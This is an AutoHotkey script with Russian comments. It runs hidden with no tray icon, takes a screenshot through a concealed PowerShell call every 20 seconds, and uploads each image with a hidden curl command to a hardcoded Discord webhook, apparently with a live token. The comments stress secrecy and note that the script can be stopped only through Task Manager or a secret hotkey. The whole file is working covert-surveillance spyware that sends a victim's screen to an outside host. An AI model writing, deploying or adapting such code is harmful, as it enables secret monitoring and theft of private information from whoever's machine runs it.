; --- НАСТРОЙКИ ---
#NoTrayIcon          ; Полностью скрывает иконку из трея
#Persistent          ; Скрипт не закроется сам по себе
#NoEnv               ; Стандартная оптимизация
#SingleInstance Force ; Не дает запустить две копии скрипта одновременно

WebhookURL := "https://discord.com/api/webhooks/1486291281092018176/RL5xSrXf8y4B69UMJf2lDWh3tNEcjhKlXmre95wsI-fsVphvkiEtFsvE_4JOgR1OlOZh"
Interval   := 20000 ; 20 секунд

; Запускаем таймер сразу
SetTimer, AutoScreen, %Interval%
return

AutoScreen:
    TempFile := A_Temp . "\hidden_screen.png"
    
    ; Захват экрана через PowerShell
    psCommand =
    (
    Add-Type -AssemblyName System.Windows.Forms;
    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
    $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height;
    $g = [System.Drawing.Graphics]::FromImage($b);
    $g.CopyFromScreen(0, 0, 0, 0, $b.Size);
    $b.Save('%TempFile%', [System.Drawing.Imaging.ImageFormat]::Png);
    $g.Dispose(); $b.Dispose();
    )
    
    RunWait, powershell -NoProfile -ExecutionPolicy Bypass -Command "%psCommand%", , Hide
    
    if FileExist(TempFile) {
        ; Отправка через curl (скрыто)
        RunWait, curl.exe -F "file=@%TempFile%" "%WebhookURL%", , Hide
        FileDelete, %TempFile%
    }
return

; --- СЕКРЕТНЫЕ КНОПКИ ---
; Поскольку иконки нет, закрыть скрипт можно только через Диспетчер задач 
; или нажав комбинацию клавиш (например, Ctrl + Alt + Esc)

^!Esc:: ExitApp ; Ctrl + Alt + Esc — полностью закрыть скрипт